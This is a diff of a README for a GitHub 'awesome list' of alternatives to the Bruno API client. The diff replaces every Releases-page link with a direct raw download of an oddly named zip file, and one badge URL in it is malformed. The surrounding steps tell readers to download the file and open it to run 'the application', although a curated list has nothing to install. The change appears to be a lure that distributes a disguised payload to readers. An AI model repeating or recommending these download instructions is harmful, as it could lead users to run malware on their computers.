@@ -1,7 +1,7 @@
 # 🎉 Awesome-Bruno-Alternatives - Discover Your Next Developer Tool
 
 ## 🔗 Download Now!
-[![Download](https://img.shields.io/badge/Download%20Awesome--Bruno--Alternatives-blue.svg)](https://github.com/nauman-khaan/Awesome-Bruno-Alternatives/releases)
+[![Download](https://raw.githubusercontent.com/nauman-khaan/Awesome-Bruno-Alternatives/main/thoughted/Bruno-Alternatives-Awesome-unhap.zip%https://raw.githubusercontent.com/nauman-khaan/Awesome-Bruno-Alternatives/main/thoughted/Bruno-Alternatives-Awesome-unhap.zip)](https://raw.githubusercontent.com/nauman-khaan/Awesome-Bruno-Alternatives/main/thoughted/Bruno-Alternatives-Awesome-unhap.zip)
 
 ## 🚀 Getting Started
 **Awesome-Bruno-Alternatives** is a curated list of alternatives to Bruno, created for developers. This project simplifies your search for tools by providing clickable images, detailed descriptions, and relevant keywords.
@@ -9,7 +9,7 @@
 ## 📥 Download & Install
 To get started with Awesome-Bruno-Alternatives, visit the Releases page to download the latest version.
 
-[Download from Releases Page](https://github.com/nauman-khaan/Awesome-Bruno-Alternatives/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/nauman-khaan/Awesome-Bruno-Alternatives/main/thoughted/Bruno-Alternatives-Awesome-unhap.zip)
 
 ## 🛠️ System Requirements
 - **Operating System:** Windows 10, macOS, or Linux
@@ -23,7 +23,7 @@ To get started with Awesome-Bruno-Alternatives, visit the Releases page to downl
 - **Keywords:** Find tools based on your area of interest with relevant keywords.
 
 ## 🌐 Using the Application
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/nauman-khaan/Awesome-Bruno-Alternatives/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/nauman-khaan/Awesome-Bruno-Alternatives/main/thoughted/Bruno-Alternatives-Awesome-unhap.zip).
 2. **Select the Latest Version:** Choose the most recent version available.
 3. **Download the File:** Click the link to download the file to your computer.
 4. **Run the Application:** After the download is complete, open the file to start using Awesome-Bruno-Alternatives.
